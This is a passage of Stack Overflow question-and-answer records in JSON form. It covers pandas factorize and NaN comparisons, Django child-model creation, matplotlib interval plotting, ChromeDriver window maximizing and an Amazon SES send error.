"Alexander", "link": "https://stackoverflow.com/users/2411802/alexander"}, "is_accepted": false, "score": 1, "last_activity_date": 1463013459, "creation_date": 1463013459, "answer_id": 37175416, "question_id": 37175022, "link": "https://stackoverflow.com/questions/37175022/equivalent-of-pandas-factorize-for-multiple-columns/37175416#37175416", "title": "Equivalent of Pandas Factorize For Multiple Columns?", "body": "<p>Here are two methods you can try:</p>\n\n<pre><code>df = pd.DataFrame({'a': [1, 1, 0], \n                   'b': [0, 1, 0], \n                   'c': [1, 1, 1]})\n\n&gt;&gt;&gt; df\n   a  b  c\n0  1  0  1\n1  1  1  1\n2  0  0  1\n\n&gt;&gt;&gt; [\"\".join(row) for row in df[['a', 'b', 'c']].values.astype(str)]\nOut[22]: ['101', '111', '001']\n\n&gt;&gt;&gt; [bytearray(\"\".join(row)) for row in df[['a', 'b', 'c']].values.astype(str)]\nOut[23]: [bytearray(b'101'), bytearray(b'111'), bytearray(b'001')]\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 34745, "user_id": 1494637, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/a50559f059e0621b4f543bcda9aad0a6?s=128&d=identicon&r=PG&f=1", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1494637/stefan"}, "is_accepted": false, "score": 1, "last_activity_date": 1463013948, "creation_date": 1463013948, "answer_id": 37175488, "question_id": 37175022, "link": "https://stackoverflow.com/questions/37175022/equivalent-of-pandas-factorize-for-multiple-columns/37175488#37175488", "title": "Equivalent of Pandas Factorize For Multiple Columns?", "body": "<p>You may want to take a look at <code>patsy</code> which addresses things like categorical variable encoding and other model-related issues: <a href=\"http://patsy.readthedocs.io/en/latest/categorical-coding.html\" rel=\"nofollow\">see docs</a>.</p>\n\n<p><code>Patsy</code> offers quite a few <a href=\"http://patsy.readthedocs.io/en/latest/API-reference.html#handling-categorical-data\" rel=\"nofollow\">encoding schemes</a>, including:</p>\n\n<ul>\n<li>Treatment (default)</li>\n<li>Backward difference coding</li>\n<li>Orthogonal polynomial contrast coding</li>\n<li>Deviation coding (also known as sum-to-zero coding), and</li>\n<li>Helmert contrasts </li>\n</ul>\n"}], "owner": {"reputation": 1003, "user_id": 1483516, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/97f19b874f98797ff0a07478d351e29a?s=128&d=identicon&r=PG", "display_name": "seewalker", "link": "https://stackoverflow.com/users/1483516/seewalker"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 649, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1463013948, "creation_date": 1463010397, "question_id": 37175022, "link": "https://stackoverflow.com/questions/37175022/equivalent-of-pandas-factorize-for-multiple-columns", "title": "Equivalent of Pandas Factorize For Multiple Columns?", "body": "<p>I have three binary-type columns of a dataframe whose values together constitute a meaningful grouping of the data. To refer to the group, I'm currently making a new column a hard-coded binary encoding like so:</p>\n\n<pre><code>data['type'] = data['a'] + 2 * data['b'] + 4 * data['c']\n</code></pre>\n\n<p>Pandas <code>factorize</code> will assign an integer for each distinct value of a sequence, but it doesn't seem to work with combinations of multiple columns. Is there a more general pandas function for situations like this? It would be nice if such a function generalized to K distinct categorical variables of arbitrary number of categories, rather than being limited to binary variables.</p>\n\n<p>If such a thing doesn't exist, would there be interest in a pull request?</p>\n"}, {"tags": ["python", "django", "django-models", "django-socialauth"], "answers": [{"tags": [], "owner": {"reputation": 391, "user_id": 4472038, "user_type": "registered", "accept_rate": 91, "profile_image": "https://lh6.googleusercontent.com/-d_lpfQE5daw/AAAAAAAAAAI/AAAAAAAAAlU/0oRpP2HPU7U/photo.jpg?sz=128", "display_name": "Rodolpho Pivetta Sabino", "link": "https://stackoverflow.com/users/4472038/rodolpho-pivetta-sabino"}, "is_accepted": true, "score": 2, "last_activity_date": 1463190093, "last_edit_date": 1495540793, "creation_date": 1463011775, "answer_id": 37175216, "question_id": 37175011, "link": "https://stackoverflow.com/questions/37175011/create-child-model-from-base-model-in-django/37175216#37175216", "title": "&quot;Create&quot; child model from base model in django", "body": "<p>After some tests and related searchs I found a solution.</p>\n\n<p>In my case, in the view where I'll save the Client or Professional user, I'll use:</p>\n\n<pre><code>common_user = CommonUser.objects.get(id=id)\ncommon_user.__class__ = Client\ncommon_user.save()\n</code></pre>\n\n<p><strong>EDIT</strong></p>\n\n<p>The method above looks insecure second <a href=\"https://stackoverflow.com/questions/13280680/how-dangerous-is-setting-self-class-to-something-else\">this</a> discussion.</p>\n\n<p>Some more searches and I found the solution <a href=\"https://stackoverflow.com/a/21150372/4472038\">here</a></p>\n\n<p>Basically:</p>\n\n<pre><code>class CommonUser(AbstractUser):\n    # attributes...\n\n    @classmethod\n    def create_child(cls, child_class, attrs):\n        \"\"\"\n        Inputs:\n        - child_class: child class prototype\n        - attrs: dictionary of new attributes for child\n        \"\"\"\n        try:\n            id = attrs.pop('id', None)\n            common_user = CommonUser.objects.get(id=id)\n        except Exception as e:\n            raise e\n        parent_link_field = child_class._meta.parents.get(common_user.__class__, None)\n        attrs[parent_link_field.name] = common_user\n        for field in common_user._meta.fields:\n            value = getattr(common_user, field.name)\n            if value:\n                attrs[field.name] = value\n        s = child_class(**attrs)\n        s.save()\n        return s\n\n\nclass Professional(CommonUser):\n    # attributes...\n\n\nclass Client(CommonUser):\n    # attributes...\n</code></pre>\n\n<p>And now I can perform:</p>\n\n<pre><code>&gt;&gt;&gt; professional = CommonUser.create_child(Professional, {'id': 1})\n&gt;&gt;&gt; client = CommonUser.create_child(Client, {'id': 2})\n</code></pre>\n"}], "owner": {"reputation": 391, "user_id": 4472038, "user_type": "registered", "accept_rate": 91, "profile_image": "https://lh6.googleusercontent.com/-d_lpfQE5daw/AAAAAAAAAAI/AAAAAAAAAlU/0oRpP2HPU7U/photo.jpg?sz=128", "display_name": "Rodolpho Pivetta Sabino", "link": "https://stackoverflow.com/users/4472038/rodolpho-pivetta-sabino"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1767, "favorite_count": 3, "accepted_answer_id": 37175216, "answer_count": 1, "score": 0, "last_activity_date": 1463190093, "creation_date": 1463010301, "question_id": 37175011, "link": "https://stackoverflow.com/questions/37175011/create-child-model-from-base-model-in-django", "title": "&quot;Create&quot; child model from base model in django", "body": "<p>I have three models, a base called <code>CommonUser(AbstractUser)</code> and two children, <code>Professional(CommonUser)</code> and <code>Client(CommonUser)</code>.</p>\n\n<p>I'm using the <a href=\"https://github.com/st4lk/django-rest-social-auth\" rel=\"nofollow\">django-rest-social-auth</a> to create users from Facebook, Google, etc., and in my settings, I set <code>AUTH_USER_MODEL = 'users.CommonUser'</code>, but I have two steps to create users, first using the social login, after this, I have a form to fill rest of data from a type of user.</p>\n\n<p>I need now to create a Client or a Professional instance from the CommonUser created by the django-rest-social-auth, in other words, I want to \"move\" the CommonUser instance created by django-rest-social-auth to a Client instance or a Professional instance after submit the second step form.</p>\n"}, {"tags": ["python", "numpy", "pandas"], "answers": [{"comments": [{"owner": {"reputation": 238133, "user_id": 2336654, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/Mqqfo.png?s=128&g=1", "display_name": "piRSquared", "link": "https://stackoverflow.com/users/2336654/pirsquared"}, "edited": false, "score": 0, "creation_date": 1463013269, "post_id": 37175088, "comment_id": 61885389, "body": "This is the answer"}, {"owner": {"reputation": 2290, "user_id": 1945087, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/a821bc5d486ccd8228e6cf740e12d51f?s=128&d=identicon&r=PG", "display_name": "J Jones", "link": "https://stackoverflow.com/users/1945087/j-jones"}, "edited": false, "score": 0, "creation_date": 1463013386, "post_id": 37175088, "comment_id": 61885426, "body": "Thanks -- this is really helpful.  I was sticking to what I thought was the standard for pandas, but this has helped me understand the type issue a little better."}], "tags": [], "owner": {"reputation": 34745, "user_id": 1494637, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/a50559f059e0621b4f543bcda9aad0a6?s=128&d=identicon&r=PG&f=1", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1494637/stefan"}, "is_accepted": true, "score": 2, "last_activity_date": 1463010881, "creation_date": 1463010881, "answer_id": 37175088, "question_id": 37175007, "link": "https://stackoverflow.com/questions/37175007/dataframe-logic-operations-with-nan/37175088#37175088", "title": "DataFrame logic operations with NaN", "body": "<p>Your <code>col1</code> is of type <code>float</code> after assigning all <code>np.nan</code> so trying to compare to a <code>string</code> throws a <code>TypeError</code>. :</p>\n\n<pre><code>df = pd.DataFrame(['one', 'two', 'three'], range(1, 4), columns=['col1'])\ndf.loc[1, 'col1'] = np.nan\n\n    col1\n1    NaN\n2    two\n3  three\n</code></pre>\n\n<p>Assigning a single <code>np.nan</code> to a column that contains <code>string</code> values leaves <code>dtype</code> object:</p>\n\n<pre><code>df.info()\n\n&lt;class 'pandas.core.frame.DataFrame'&gt;\nRangeIndex: 3 entries, 1 to 3\nData columns (total 1 columns):\ncol1    2 non-null object\ndtypes: object(1)\n</code></pre>\n\n<p>But all <code>np.nan</code> values converts to <code>float</code>:</p>\n\n<pre><code>df.loc[:, 'col1'] = np.nan\ndf.info()\n\n&lt;class 'pandas.core.frame.DataFrame'&gt;\nRangeIndex: 3 entries, 1 to 3\nData columns (total 1 columns):\ncol1    0 non-null float64\ndtypes: float64(1)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 238133, "user_id": 2336654, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/Mqqfo.png?s=128&g=1", "display_name": "piRSquared", "link": "https://stackoverflow.com/users/2336654/pirsquared"}, "is_accepted": false, "score": 0, "last_activity_date": 1463013227, "creation_date": 1463013227, "answer_id": 37175392, "question_id": 37175007, "link": "https://stackoverflow.com/questions/37175007/dataframe-logic-operations-with-nan/37175392#37175392", "title": "DataFrame logic operations with NaN", "body": "<p>If you had done:</p>\n\n<pre><code># assign all col1 values to None\ndf.loc[:, 'col1'] = None\n</code></pre>\n\n<p>Then</p>\n\n<pre><code># this comparison does not fail\nprint df['col1'] == 'three'\n\n1    False\n2    False\n3    False\nName: col1, dtype: bool\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 29554, "user_id": 839957, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/3ac5824c6cc4817a754a186d6a45a08b?s=128&d=identicon&r=PG", "display_name": "maxymoo", "link": "https://stackoverflow.com/users/839957/maxymoo"}, "is_accepted": false, "score": 1, "last_activity_date": 1463016428, "creation_date": 1463016428, "answer_id": 37175774, "question_id": 37175007, "link": "https://stackoverflow.com/questions/37175007/dataframe-logic-operations-with-nan/37175774#37175774", "title": "DataFrame logic operations with NaN", "body": "<p>The problem can be solved by using the <code>ix</code> indexer rather than <code>iloc</code>, in which case the datatype of the series isn't changed (not sure why this is, presumably both types of indexers should have consistent behaviour, my preference would be to change <code>iloc</code> to match <code>ix</code>):</p>\n\n<pre><code>&gt;&gt;&gt; df = pd.DataFrame(['one', 'two', 'three'], range(1,4), columns=['col1'])\n&gt;&gt;&gt; df['col1'].ix[:] = np.nan\n&gt;&gt;&gt; df.dtypes\n\ncol1    object\ndtype: object\n</code></pre>\n"}], "owner": {"reputation": 2290, "user_id": 1945087, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/a821bc5d486ccd8228e6cf740e12d51f?s=128&d=identicon&r=PG", "display_name": "J Jones", "link": "https://stackoverflow.com/users/1945087/j-jones"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1354, "favorite_count": 1, "accepted_answer_id": 37175088, "answer_count": 3, "score": 3, "last_activity_date": 1568545329, "creation_date": 1463010273, "last_edit_date": 1568545329, "question_id": 37175007, "link": "https://stackoverflow.com/questions/37175007/dataframe-logic-operations-with-nan", "title": "DataFrame logic operations with NaN", "body": "<p>I'm trying to do some comparisons in a pandas DataFrame.  </p>\n\n<pre><code># create simple DataFrame\ndf = pd.DataFrame(['one', 'two', 'three'], range(1,4), columns=['col1'])\n#df:\n#    col1\n#1    one\n#2    two\n#3  three\n\n# assign one col1 value to be NAN\ndf.loc[1, 'col1'] = np.nan \n# this comparison works\nprint(df['col1'] == 'three')\n\n# assign all col1 values to NAN\ndf.loc[:, 'col1'] = np.nan\n# this comparison fails\nprint(df['col1'] == 'three')\n</code></pre>\n\n<p>The first comparison (with only one NAN value in the column) works as expected, but the second (with all NAN values in the column) produces this error: <code>TypeError: invalid type comparison</code></p>\n\n<p>What's going on here?  </p>\n\n<p>I saw this <a href=\"https://stackoverflow.com/questions/35278265/pandas-when-data-is-nan-logic-operations-cannot-be-done\">question</a>, which suggests some possible but kind of hack-y solutions to this problem.  </p>\n\n<p>But why is this the behavior happening in the first place?  Is this restriction useful, somehow?  I can fix it by using <code>df.fillna('')</code> before my comparisons, but this seems clunky and irritating.  </p>\n\n<p>So my questions are:<br>\n1.  What is the cleanest way around this issue?<br>\n2.  Why is this the default behavior, anyway?</p>\n"}, {"tags": ["python", "matplotlib"], "comments": [{"owner": {"reputation": 587, "user_id": 4189024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/O8QmT.png?s=128&g=1", "display_name": "wsj", "link": "https://stackoverflow.com/users/4189024/wsj"}, "edited": false, "score": 0, "creation_date": 1463042761, "post_id": 37175000, "comment_id": 61896714, "body": "Can you give the outputs of <code>shape(y)</code>, <code>shape(start)</code>, <code>shape(stop)</code> and <code>shape(is_ok)</code>? I suppose your data arrays don&#39;t have the same dimension."}], "answers": [{"comments": [{"owner": {"reputation": 15, "user_id": 4785490, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-ftGlakh0TNU/AAAAAAAAAAI/AAAAAAAAA7E/IMm0AMn8LFI/photo.jpg?sz=128", "display_name": "Juan C. Olivares V.", "link": "https://stackoverflow.com/users/4785490/juan-c-olivares-v"}, "edited": false, "score": 0, "creation_date": 1463359472, "post_id": 37189035, "comment_id": 62019290, "body": "Thanks VERY much! it works! Now, I&#39;m posting the solution (linked to this page) on the original post so if anyone has the same error, He/she can find the answer."}, {"owner": {"reputation": 15, "user_id": 4785490, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-ftGlakh0TNU/AAAAAAAAAAI/AAAAAAAAA7E/IMm0AMn8LFI/photo.jpg?sz=128", "display_name": "Juan C. Olivares V.", "link": "https://stackoverflow.com/users/4785490/juan-c-olivares-v"}, "edited": false, "score": 0, "creation_date": 1463679945, "post_id": 37189035, "comment_id": 62179584, "body": "well, the admins keep deleting my responses on the original post. Hope if someone has the same issue, somehow get the solution"}, {"owner": {"reputation": 49128, "user_id": 588071, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d0e0397d27c84e04451691ddb6c8d49c?s=128&d=identicon&r=PG&f=1", "display_name": "tmdavison", "link": "https://stackoverflow.com/users/588071/tmdavison"}, "reply_to_user": {"reputation": 15, "user_id": 4785490, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-ftGlakh0TNU/AAAAAAAAAAI/AAAAAAAAA7E/IMm0AMn8LFI/photo.jpg?sz=128", "display_name": "Juan C. Olivares V.", "link": "https://stackoverflow.com/users/4785490/juan-c-olivares-v"}, "edited": false, "score": 0, "creation_date": 1463682352, "post_id": 37189035, "comment_id": 62180984, "body": "If this solved your issue you might consider accepting the answer"}, {"owner": {"reputation": 15, "user_id": 4785490, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-ftGlakh0TNU/AAAAAAAAAAI/AAAAAAAAA7E/IMm0AMn8LFI/photo.jpg?sz=128", "display_name": "Juan C. Olivares V.", "link": "https://stackoverflow.com/users/4785490/juan-c-olivares-v"}, "edited": false, "score": 0, "creation_date": 1463883019, "post_id": 37189035, "comment_id": 62252023, "body": "OK, I clicked on the &quot;check&quot; image and turn green.... this means that I accept it? I&#39;m pretty much new here...."}], "tags": [], "owner": {"reputation": 49128, "user_id": 588071, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d0e0397d27c84e04451691ddb6c8d49c?s=128&d=identicon&r=PG&f=1", "display_name": "tmdavison", "link": "https://stackoverflow.com/users/588071/tmdavison"}, "is_accepted": true, "score": 0, "last_activity_date": 1463061169, "creation_date": 1463061169, "answer_id": 37189035, "question_id": 37175000, "link": "https://stackoverflow.com/questions/37175000/labeled-intervals-in-matplotlib/37189035#37189035", "title": "labeled intervals in matplotlib", "body": "<p>The issue is that when you only read 1 item with <code>np.genfromtxt</code>, it is producing scalars (0-dimensions). We need them to be at least 1D.</p>\n\n<p>You can add these lines just above where you define your <code>timelines</code> function, and then everything works ok.</p>\n\n<p>This makes use of the <code>numpy</code> function <a href=\"http://docs.scipy.org/doc/numpy-1.10.0/reference/generated/numpy.atleast_1d.html\" rel=\"nofollow noreferrer\"><code>np.atleast_1d()</code></a>, to turn the scalars into 1D <code>numpy</code> arrays.</p>\n\n<pre><code>#Check the dimensions are at least 1D (for 1-item data input)\nif start.ndim &lt; 1:\n    start = np.atleast_1d(start)\nif stop.ndim &lt; 1::\n    stop = np.atleast_1d(stop)    \nif is_ok.ndim &lt; 1:\n    is_ok = np.atleast_1d(is_ok)    \nif not_ok.ndim &lt; 1:\n    not_ok = np.atleast_1d(is_ok)  \n</code></pre>\n\n<p>The output:</p>\n\n<p><a href=\"https://i.stack.imgur.com/5JY1t.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/5JY1t.png\" alt=\"enter image description here\"></a></p>\n"}], "owner": {"reputation": 15, "user_id": 4785490, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-ftGlakh0TNU/AAAAAAAAAAI/AAAAAAAAA7E/IMm0AMn8LFI/photo.jpg?sz=128", "display_name": "Juan C. Olivares V.", "link": "https://stackoverflow.com/users/4785490/juan-c-olivares-v"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 364, "favorite_count": 0, "accepted_answer_id": 37189035, "answer_count": 1, "score": 1, "last_activity_date": 1463061169, "creation_date": 1463010245, "last_edit_date": 1495541281, "question_id": 37175000, "link": "https://stackoverflow.com/questions/37175000/labeled-intervals-in-matplotlib", "title": "labeled intervals in matplotlib", "body": "<p>I'm making a reference to the question on <a href=\"https://stackoverflow.com/questions/7684475/plotting-labeled-intervals-in-matplotlib-gnuplot/37159537#37159537\">Plotting labeled intervals in matplotlib/gnuplot</a>, the problem with the solution exposed there, is that doesn't work with only one line of data in the files. This is the code I'm trying:</p>\n\n<pre><code>#!/usr/bin/env python\n#\n\nimport matplotlib.pyplot as plt\nfrom matplotlib.dates import DateFormatter, MinuteLocator, SecondLocator\nimport numpy as np\nfrom StringIO import StringIO\nimport datetime as dt\n\na=StringIO(\"\"\"MMEX 2016-01-29T12:38:22 2016-01-29T12:39:03 SUCCESS \n\"\"\")\n\n#Converts str into a datetime object.\nconv = lambda s: dt.datetime.strptime(s, '%Y-%m-%dT%H:%M:%S')\n\n#Use numpy to read the data in. \ndata = np.genfromtxt(a, converters={1: conv, 2: conv},\n                 names=['caption', 'start', 'stop', 'state'], dtype=None)\ncap, start, stop = data['caption'], data['start'], data['stop']\n\n#Check the status, because we paint all lines with the same color \n#together\nis_ok = (data['state'] == 'SUCCESS')\nnot_ok = np.logical_not(is_ok)\n\n#Get unique captions and there indices and the inverse mapping    \ncaptions, unique_idx, caption_inv = np.unique(cap, 1, 1)\n\n#Build y values from the number of unique captions.\ny = (caption_inv + 1) / float(len(captions) + 1)\n\n#Plot function\ndef timelines(y, xstart, xstop, color='b'):\n    \"\"\"Plot timelines at y from xstart to xstop with given color.\"\"\"   \n    plt.hlines(y, xstart, xstop, color, lw=4)\n    plt.vlines(xstart, y+0.005, y-0.005, color, lw=2)\n    plt.vlines(xstop, y+0.005, y-0.005, color, lw=2)\n\n#Plot ok tl black    \ntimelines(y[is_ok], start[is_ok], stop[is_ok], 'k')\n#Plot fail tl red\ntimelines(y[not_ok], start[not_ok], stop[not_ok], 'r')\n\n#Setup the plot\nax = plt.gca()\nax.xaxis_date()\nmyFmt = DateFormatter('%Y-%m-%dT%H:%M:%S')\nax.xaxis.set_major_formatter(myFmt)\nax.xaxis.set_major_locator(SecondLocator(interval=3600)) # used to be         SecondLocator(0, interval=20)\n\n#To adjust the xlimits a timedelta is needed.\ndelta = (stop.max() - start.min())/10\n\nplt.yticks(y[unique_idx], captions)\nplt.ylim(0,1)\nplt.xlim(start.min()-delta, stop.max()+delta)\nplt.xlabel('Time')\nplt.xticks(rotation=70)\nplt.show(block=True)\n</code></pre>\n\n<p>When I try this code, I get the following error:</p>\n\n<pre><code>Traceback (most recent call last):\n  File \"./testPlot.py\", line 49, in &lt;module&gt;\n    timelines(y[is_ok], start[is_ok], stop[is_ok], 'k')\nValueError: boolean index array should have 1 dimension\n</code></pre>\n\n<p>Also, when I try to add a dummy line on the data, let's said \"MMEX 2016-01-01T00:00:00 2016-01-01T00:00:00 SUCCESS\", the plot works but doesn't look good.</p>\n\n<p>Any suggestions? I tried to put this question on the same post when I found the solution, but I don't have enough reputation...</p>\n\n<p>Thanks in advance</p>\n"}, {"tags": ["python", "google-chrome", "selenium"], "answers": [{"tags": [], "owner": {"reputation": 985, "user_id": 5357503, "user_type": "registered", "accept_rate": 60, "profile_image": "https://graph.facebook.com/524652594354467/picture?type=large", "display_name": "middlestump", "link": "https://stackoverflow.com/users/5357503/middlestump"}, "is_accepted": false, "score": 9, "last_activity_date": 1463010516, "creation_date": 1463010516, "answer_id": 37175037, "question_id": 37174984, "link": "https://stackoverflow.com/questions/37174984/chromedriver-maximize-issue/37175037#37175037", "title": "Chromedriver maximize issue", "body": "<p>Just looked at my code and noticed that my import is</p>\n\n<pre><code> from selenium.webdriver.chrome.options import Options\n</code></pre>\n\n<p>And the rest of the code is </p>\n\n<pre><code> options = Options() \n options.add_argument(\"--start-maximized\") \n driver=webdriver.Chrome(chrome_options=options) \n</code></pre>\n\n<p>This does work</p>\n"}, {"tags": [], "owner": {"reputation": 411841, "user_id": 771848, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2DTBv.jpg?s=128&g=1", "display_name": "alecxe", "link": "https://stackoverflow.com/users/771848/alecxe"}, "is_accepted": false, "score": 2, "last_activity_date": 1463011255, "creation_date": 1463011255, "answer_id": 37175134, "question_id": 37174984, "link": "https://stackoverflow.com/questions/37174984/chromedriver-maximize-issue/37175134#37175134", "title": "Chromedriver maximize issue", "body": "<p>There is an <a href=\"https://bugs.chromium.org/p/chromedriver/issues/detail?id=985\" rel=\"nofollow\">open issue</a> in ChromeDriver which is <em>specific to Mac OS X</em>.</p>\n\n<p>What I remember helped was to first set the dimensions explicitly and then maximize:</p>\n\n<pre><code>driver.set_window_size(1200, 800)\ndriver.maximize_window()\n</code></pre>\n"}], "owner": {"reputation": 219, "user_id": 6322885, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7ccfa282f7b5edacc077c341f051ecaa?s=128&d=identicon&r=PG&f=1", "display_name": "premonition", "link": "https://stackoverflow.com/users/6322885/premonition"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4340, "favorite_count": 1, "answer_count": 2, "score": 4, "last_activity_date": 1463012230, "creation_date": 1463010145, "last_edit_date": 1463012230, "question_id": 37174984, "link": "https://stackoverflow.com/questions/37174984/chromedriver-maximize-issue", "title": "Chromedriver maximize issue", "body": "<p>I'm new to this forum as well as to programming and selenium.\nI'm trying to maximize my chrome browser using selenium python(using the below code) and everytime selenium opens the browser it would not maximize the whole window.It maximizes only half the screen with \"data:,\" already filled on the address bar.</p>\n\n<pre><code>self.driver = webdriver.Chrome() \nself.driver.maximize_window()\n</code></pre>\n\n<p>I also tried </p>\n\n<pre><code>options=webdriver.ChromeOptions()\noptions.add_argument(\"--start-maximized\")\ndriver=webdriver.Chrome(chrome_options=options)\n</code></pre>\n\n<p>but doesn't help</p>\n\n<p><a href=\"https://i.stack.imgur.com/eGlsP.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/eGlsP.png\" alt=\"Screenshot of the browser\"></a></p>\n"}, {"tags": ["python", "amazon-ses"], "answers": [{"tags": [], "owner": {"reputation": 3164, "user_id": 733092, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/DAX12.png?s=128&g=1", "display_name": "Noumenon", "link": "https://stackoverflow.com/users/733092/noumenon"}, "is_accepted": true, "score": 2, "last_activity_date": 1463013770, "last_edit_date": 1495535474, "creation_date": 1463013770, "answer_id": 37175453, "question_id": 37174938, "link": "https://stackoverflow.com/questions/37174938/amazon-ses-getting-error-result-conn-send-raw-emailmsg-as-string-attribute/37175453#37175453", "title": "amazon ses getting error result = conn.send_raw_email(msg.as_string(), AttributeError: &#39;NoneType&#39; object has no attribute &#39;send_raw_email&#39;", "body": "<p>You call <code>conn.send_raw_email</code> and get a response that you are trying to access the .send_raw_email of a NoneType. Therefore, <code>conn == None</code>. You should check for that. The <a href=\"http://boto.cloudhackers.com/en/latest/ref/ses.html\" rel=\"nofollow noreferrer\">docs</a> for boto.ses.connect_to_region say it returns None if you give an invalid region name. From <a href=\"https://stackoverflow.com/a/28089857/733092\">this list of regions</a> it looks like your problem is your region name should be in lower case instead of upper.</p>\n"}, {"tags": [], "owner": {"reputation": 9, "user_id": 3785984, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EfPJv.png?s=128&g=1", "display_name": "Ganang Wahyu", "link": "https://stackoverflow.com/users/3785984/ganang-wahyu"}, "is_accepted": false, "score": 0, "last_activity_date": 1580283805, "creation_date": 1580283805, "answer_id": 59962490, "question_id": 37174938, "link": "https://stackoverflow.com/questions/37174938/amazon-ses-getting-error-result-conn-send-raw-emailmsg-as-string-attribute/59962490#59962490", "title": "amazon ses getting error result = conn.send_raw_email(msg.as_string(), AttributeError: &#39;NoneType&#39; object has no attribute &#39;send_raw_email&#39;", "body": "<p>if you using a python under 2.5 you should checking your env for BOTO because some region not supported from aws SES for python under 2.5 version for now.</p>\n\n<p>you can check ur region support in your shell if you using boto </p>\n\n<pre><code>$python\n&gt;&gt;&gt; from boto import ses\n&gt;&gt;&gt; ses.regions()\n[RegionInfo:us-east-1] #this is region supported for python version\n</code></pre>\n"}], "owner": {"reputation": 1987, "user_id": 2654232, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/f0a16c52c3b5a42ebd363c43b8175f30?s=128&d=identicon&r=PG&f=1", "display_name": "Ranvijay", "link": "https://stackoverflow.com/users/2654232/ranvijay"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 531, "favorite_count": 1, "accepted_answer_id": 37175453, "answer_count": 2, "score": 3, "last_activity_date": 1580283805, "creation_date": 1463009772, "question_id": 37174938, "link": "https://stackoverflow.com/questions/37174938/amazon-ses-getting-error-result-conn-send-raw-emailmsg-as-string-attribute", "title": "amazon ses getting error result = conn.send_raw_email(msg.as_string(), AttributeError: &#39;NoneType&#39; object has no attribute &#39;send_raw_email&#39;", "body": "<p>I am trying to send raw email using ses and getting error result = conn.send_raw_email(msg.as_string(), AttributeError: 'NoneType' object has no attribute 'send_raw_email',  Can you please take look? Thanks a lot.</p>\n\n<pre><code>import boto.ses\nfrom email.mime.application import MIMEApplication\nfrom email.mime.multipart import MIMEMultipart\n\n\ndef send_ses():\n    to_emails = ['contact.ranvijay@gmail.com']\n    COMMASPACE = ', '\n    msg = MIMEMultipart()\n    msg['Subject'] = 'test'\n    msg['From'] = 'contact.ranvijay@gmail.com'\n    msg['To'] = COMMASPACE.join(to_emails)\n    # msg.attach(MIMEText(body))\n    filename = '/Users/Mac/test/products/error_csv/price_upload_error_2016-05-10 19:50:06.868506.csv'\n\n    attachment = open(filename, 'rb').read()\n    part = MIMEApplication(attachment)\n    part.add_header('Content-Disposition', 'attachment', filename='test.csv')\n    msg.attach(part)\n\n    try:\n        conn = boto.ses.connect_to_region(\n                'US-EAST-1',\n                aws_access_key_id=AWS_ACCESS_KEY,\n                aws_secret_access_key=AWS_SECRET_KEY\n        )\n    except Exception as e:\n        return e.__str__()\n\n    result = conn.send_raw_email(msg.as_string(),\n                                 source=msg['From'],\n                                 destinations=to_emails\n                                 )\n\n    return result if 'ErrorResponse' in result else ''\n\nif __name__ == '__main__':\n    send_ses()\n</code></pre>\n"}, {"tags": ["python", "tkinter"], "comments": [{"owner": {"reputation": 305939, "user_id": 7432, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/3e3921ee8a7792e4b5da0244933395e8?s=128&d=identicon&r=PG", "display_name": "Bryan Oakley", "link": "https://stackoverflow.com/users/7432/bryan-oakley"}, "edited": false, "score": 0, "creation_date": 1463010025, "post_id": 37174909, "comment_id": 61884557, "body": "why doesn&#39;t it &quot;get past&quot; that line? Does your computer crash?"}, {"owner": {"reputation": 17298, "user_id": 1540468, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/2f7d0c7668a2f3b53cf22c01ae63f32b?s=128&d=identicon&r=PG", "display_name": "Paul Rooney", "link": "https://stackoverflow.com/users/1540468/paul-rooney"}, "edited": false, "score": 0, "creation_date": 1463010148, "post_id": 37174909, "comment_id": 61884592, "body": "Can you provide a more complete example of the issue? Something like an <a href=\"http://stackoverflow.com/help/mcve\">mcve</a>"}], "answers": [{"tags": [], "owner": {"reputation": 13, "user_id": 6322930, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f07dfa64fff46d4e2f1fa7486ba8f615?s=128&d=identicon&r=PG", "display_name": "user6322930", "link": 